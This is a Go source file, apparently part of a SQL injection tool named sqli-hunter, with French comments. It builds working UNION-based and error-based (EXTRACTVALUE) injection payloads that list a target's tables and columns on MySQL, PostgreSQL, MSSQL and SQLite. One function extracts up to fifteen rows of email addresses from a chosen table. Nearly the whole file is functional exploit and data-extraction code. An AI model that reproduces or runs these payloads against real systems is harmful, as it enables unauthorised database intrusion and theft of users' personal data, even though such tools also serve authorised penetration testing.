package extractor

import (
	"fmt"
	"strings"

	"github.com/sqli-hunter/sqli-hunter/internal/models"
)

const maxPIITables = 5
const maxPIIRows = 15

// BuildColumnsJob génère un payload pour lister les colonnes d'une table.
func BuildColumnsJob(dbms, table string, vulnType models.VulnType) ExtractionJob {
	dbms = normalizeDBMS(dbms)
	escaped := escapeSQLIdent(table)
	var payload string

	switch vulnType {
	case models.SQLiUnion:
		expr := columnsExpr(dbms, escaped)
		payload = `' UNION SELECT ` + expr + `--`
	default:
		payload = fmt.Sprintf(`1' AND EXTRACTVALUE(1,CONCAT(0x7e,(%s),0x7e))--`, columnsExpr(dbms, escaped))
	}

	return ExtractionJob{
		DataType: DataColumns,
		Payload:  payload,
		Method:   methodFor(vulnType),
		Table:    table,
	}
}

// BuildPIIDumpJob génère un payload pour extraire des lignes PII.
func BuildPIIDumpJob(dbms, table string, cols map[PIIColumnKind]string, vulnType models.VulnType) ExtractionJob {
	dbms = normalizeDBMS(dbms)
	escaped := escapeSQLIdent(table)
	expr := piiDumpExpr(dbms, escaped, cols)
	var payload string

	switch vulnType {
	case models.SQLiUnion:
		payload = `' UNION SELECT ` + expr + `--`
	default:
		payload = fmt.Sprintf(`1' AND EXTRACTVALUE(1,CONCAT(0x7e,(%s),0x7e))--`, expr)
	}

	return ExtractionJob{
		DataType: models.DataPII,
		Payload:  payload,
		Method:   methodFor(vulnType),
		Table:    table,
	}
}

// BuildTablesJob retourne un job pour lister les tables utilisateur.
func BuildTablesJob(dbms string, vulnType models.VulnType) ExtractionJob {
	dbms = normalizeDBMS(dbms)
	var payload string
	expr := tablesExpr(dbms)

	switch vulnType {
	case models.SQLiUnion:
		payload = `' UNION SELECT ` + expr + `--`
	default:
		payload = fmt.Sprintf(`1' AND EXTRACTVALUE(1,CONCAT(0x7e,(%s),0x7e))--`, expr)
	}

	return ExtractionJob{
		DataType: DataTables,
		Payload:  payload,
		Method:   methodFor(vulnType),
	}
}

func methodFor(vt models.VulnType) string {
	if vt == models.SQLiUnion {
		return "union"
	}
	return "error"
}

func columnsExpr(dbms, table string) string {
	switch dbms {
	case "postgresql":
		return fmt.Sprintf(`(SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_schema='public' AND table_name='%s')`, table)
	case "mssql":
		return fmt.Sprintf(`(SELECT TOP 1 STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='%s')`, table)
	default:
		return fmt.Sprintf(`(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='%s')`, table)
	}
}

func tablesExpr(dbms string) string {
	switch dbms {
	case "postgresql":
		return `(SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public')`
	case "mssql":
		return `(SELECT TOP 1 STRING_AGG(name,',') FROM sys.tables)`
	case "sqlite":
		return `(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table')`
	default:
		return `(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())`
	}
}

func piiDumpExpr(dbms, table string, cols map[PIIColumnKind]string) string {
	col, ok := cols[PIIEmail]
	if !ok || col == "" {
		return `NULL`
	}
	rowExpr := emailRowExpr(dbms, col)

	switch dbms {
	case "postgresql":
		return fmt.Sprintf(`(SELECT string_agg(row_data,';;') FROM (SELECT %s AS row_data FROM %s LIMIT %d) pii_sub)`,
			rowExpr, table, maxPIIRows)
	case "mssql":
		return fmt.Sprintf(`(SELECT TOP 1 STRING_AGG(row_data,';;') FROM (SELECT TOP %d %s AS row_data FROM %s) pii_sub)`,
			maxPIIRows, rowExpr, table)
	default:
		return fmt.Sprintf(`(SELECT GROUP_CONCAT(row_data SEPARATOR ';;') FROM (SELECT %s AS row_data FROM %s LIMIT %d) pii_sub)`,
			rowExpr, table, maxPIIRows)
	}
}

func emailRowExpr(dbms, col string) string {
	q := quoteIdent(dbms, col)
	switch dbms {
	case "postgresql":
		return fmt.Sprintf(`'email=' || COALESCE(%s::text,'')`, q)
	case "mssql":
		return fmt.Sprintf(`'email='+ISNULL(CAST(%s AS varchar(max)),'')`, q)
	default:
		return fmt.Sprintf(`CONCAT('email=',IFNULL(%s,''))`, q)
	}
}

func quoteIdent(dbms, col string) string {
	col = strings.ReplaceAll(col, "`", "")
	switch dbms {
	case "postgresql":
		return `"` + col + `"`
	case "mssql":
		return `[` + col + `]`
	default:
		return "`" + col + "`"
	}
}

func escapeSQLIdent(s string) string {
	return strings.ReplaceAll(s, "'", "")
}
